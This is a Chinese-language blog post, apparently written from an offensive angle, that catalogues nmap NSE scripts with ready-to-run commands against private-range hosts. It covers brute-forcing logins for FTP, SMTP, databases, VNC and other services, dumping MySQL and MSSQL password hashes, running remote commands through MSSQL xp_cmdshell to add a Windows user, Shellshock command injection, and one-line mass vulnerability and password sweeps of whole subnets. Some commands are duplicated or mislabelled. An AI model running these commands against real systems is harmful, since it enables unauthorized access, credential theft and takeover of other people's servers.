---
layout: post
title: nmap脚本检测
tags:
  - tool
categories:
  - hacker
abbrlink: 63116
---

### 前言

在实战中相对比较实用的nmap脚本

<!--more-->

```
# nmap -sV -sT -Pn –open -v 192.168.3.23
```

也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的:

```
# nmap -sT -Pn –open -v banner.nse 192.168.3.23
```

### 和ftp相关的一些漏洞检测脚本:

ftp-anon.nse 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡

```
# nmap -p 21 –script ftp-anon.nse -v 192.168.3.23
```

ftp-brute.nse ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破]

```
# nmap -p 21 –script ftp-brute.nse -v 192.168.3.23
```

ftp-vuln-cve2010-4221.nse ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出

```
# nmap -p 21 –script ftp-vuln-cve2010-4221.nse -v 192.168.3.23
```

ftp-proftpd-backdoor.nse ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令


```
# nmap -p 21 –script ftp-vuln-cve2010-4221.nse -v 192.168.3.23
```

ftp-vsftpd-backdoor.nse VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门

```
# nmap -p 21 –script ftp-vsftpd-backdoor.nse -v 192.168.3.23
```


### 和ssh 相关的一些扫描脚本:

sshv1.nse sshv1是可以中间人的

```
# nmap -p 22 –script sshv1.nse -v 192.168.3.23
```


### 和smtp 相关的一些扫描脚本:

smtp-brute.nse 简单爆破smtp

```
# nmap -p 25 –script smtp-brute.nse -v 192.168.3.23
```


smtp-enum–users.nse 枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行


```
# nmap -p 25 –script smtp-enum-users.nse -v 192.168.3.23
```


smtp-vuln-cve2010-4344.nse Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出

```
# nmap -p 25 –script smtp-vuln-cve2010-4344.nse -v 192.168.3.23
```


smtp-vuln-cve2011-1720.nse Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出


```
# nmap -p 25 –script smtp-vuln-cve2011-1720.nse -v 192.168.3.23
```

smtp-vuln-cve2011-1764.nse Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了

```
# nmap -p 25 –script smtp-vuln-cve2011-1764.nse -v 192.168.3.23
```

### 和pop3 相关的一些扫描脚本:

pop3-brute.nse pop简单弱口令爆破

```
# nmap -p 110 –script pop3-brute.nse -v 192.168.3.23
```

###  和imap 相关的一些扫描脚本:

imap-brute.nse imap简单弱口令爆破

```
# nmap -p 143,993 –script imap-brute.nse -v 192.168.3.23
```

### 和dns 相关的一些漏洞扫描脚本:

dns-zone-transfer.nse 检查目标ns服务器是否允许传送

```
# nmap -p 53 –script dns-zone-transfer.nse -v 192.168.3.23
```
```
# nmap -p 53 –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain=target.org -v 192.168.3.23
```

hostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉


```
# nmap -p80 –script hostmap-ip2hosts.nse 192.168.3.23
```


### 和各种数据库相关的扫描脚本:

informix-brute.nse informix爆破脚本

```
# nmap -p 9088 –script informix-brute.nse 192.168.3.23
```


mysql-empty-password.nse mysql 扫描root空密码


```
mysql-empty-password.nse mysql 扫描root空密码
```


mysql-brute.nse mysql root弱口令简单爆破

```
# nmap -p 3306 –script mysql-brute.nse -v 192.168.3.23
```

mysql-dump-hashes.nse 导出mysql中所有用户的hash

```
# nmap -p 3306 –script mysql-dump-hashes –script-args=’username=root,password=root’ 192.168.3.23
```

mysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]


```
# nmap -p 3306 –script mysql-vuln-cve2012-2122.nse -v 192.168.3.23
```


```
nmap -p 445 –script ms-sql-info.nse -v 203.124.11.0/24 ms-sql-info.nse 扫描C段mssql
```

```
# nmap -p 1433 –script ms-sql-info.nse –script-args mssql.instance-port=1433 -v 192.168.3.0/24
```



ms-sql-empty-password.nse 扫描mssql sa空密码

```
# nmap -p 1433 –script ms-sql-empty-password.nse -v 192.168.3.0/24
```


ms-sql-brute.nse sa弱口令爆破

```
# nmap -p 1433 –script ms-sql-brute.nse -v 192.168.3.0/24
```


ms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令


```
# nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=“net user test test /add” 192.168.3.0/24
```


ms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash


```
# nmap -p 1433 –script ms-sql-dump-hashes -v 192.168.3.0/24
```


pgsql-brute.nse 尝试爆破postgresql


```
# nmap -p 5432 –script pgsql-brute -v 192.168.3.0/24
```


oracle-brute-stealth.nse 尝试爆破oracle

```
# nmap –script oracle-brute-stealth -p 1521 –script-args oracle-brute-stealth.sid=ORCL -v 192.168.3.0/24
```


oracle-brute.nse

```
# nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL -v 192.168.3.0/24
```


mongodb-brute.nse 尝试爆破mongdb


```
# nmap -p 27017 –script mongodb-brute 192.168.3.0/24
```


redis-brute.nse redis爆破


```
# nmap -p 6379 –script redis-brute.nse 192.168.3.0/24
```


### 和snmp相关的一些扫描脚本:

snmp-brute.nse 爆破C段的snmp

```
# nmap -sU –script snmp-brute –script-args snmp-brute.communitiesdb=user.txt 192.168.3.0/24
```

### 和telnet相关的一些扫描脚本:

telnet-brute.nse 简单爆破telnet

```
# nmap -p 23 –script telnet-brute –script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24
```

### 和ldap服务相关的一些利用脚本:

ldap-brute.nse 简单爆破ldap

```
# nmap -p 389 –script ldap-brute –script-args ldap.base=’“cn=users,dc=cqure,dc=net”‘ 192.168.3.0/24
```


### 和各类web中间件,web集成环境相关的一些利用脚本:

xmpp-brute.nse xmpp爆破

```
# nmap -p 5222 –script xmpp-brute.nse 192.168.3.0/24
```

http-iis-short-name-brute.nse 短文件扫描

```
# nmap -p80 –script http-iis-short-name-brute.nse 192.168.3.0/24
```


http-iis-webdav-vuln.nse iis 5.0 /6.0 webadv写


```
# nmap –script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24
```


http-shellshock.nse bash远程执行


```
# nmap -sV -p- –script http-shellshock –script-args uri=/cgi-bin/bin,cmd=ls 192.168.3.0/24
```


http-svn-info.nse 探测目标svn


```
# nmap –script http-svn-info 192.168.3.0/24
```

http-drupal-enum.nse 其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来


http-wordpress-brute.nse


```
# nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true’ 192.168.3.0/24
```



http-backup-finder.nse 扫描目标网站备份


```
# nmap -p80 –script=http-backup-finder 192.168.3.0/24
```


http-vuln-cve2015-1635.nse iis6.0远程代码执行

```
# nmap -sV –script http-vuln-cve* –script-args uri=’/anotheruri/’ 192.168.3.0/24
```

### 跟vpn相关的一些利用脚本

pptp-version.nse 识别目标pptp版本


```
# nmap -p 1723 –script pptp-version.nse 192.168.3.0/24
```


### smb漏洞检测脚本集:


- smb-vuln-ms08-067.nse
- smb-vuln-ms10-054.nse
- smb-vuln-ms10-061.nse
- smb-vuln-ms17-010.nse smb远程执行

```
# nmap -p445 –script smb-vuln-ms17-010.nse 192.168.3.0/24
```

### 检测内网嗅探


sniffer-detect.nse

```
# nmap -sn -Pn –script sniffer-detect.nse 192.168.3.0/24
```


### 其它的一些辅助性脚本:

rsync-brute.nse 爆破目标的rsync

```
# nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.3.0/24
```


rlogin-brute.nse 爆破目标的rlogin

```
# nmap -p 513 –script rlogin-brute 192.168.3.0/24
```

vnc-brute.nse 爆破目标的vnc

```
# nmap –script vnc-brute -p 5900 192.168.3.0/24
```

pcanywhere-brute.nse 爆破pcanywhere

```
# nmap -p 5631 –script=pcanywhere-brute 192.168.3.0/24
```

nessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧

```
# nmap –script nessus-brute -p 1241 192.168.3.0/24
```

nexpose-brute.nse 爆破nexpose

```
# nmap –script nexpose-brute -p 3780 192.168.0.0/24
```


shodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的

```
# nmap –script shodan-api –script-args ‘shodan-api.target=192.168.0.0/24,shodan-api.apikey=SHODANAPIKEY’
```


0x17 尝试利用nmap一句话进行目标C段常规漏洞扫描


实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描:


```
# nmap -sT -Pn -v –script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012–1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24
```

尝试利用nmap一句话进行目标C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率:

```
# nmap -sT -v -Pn –script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.0.0/24
```

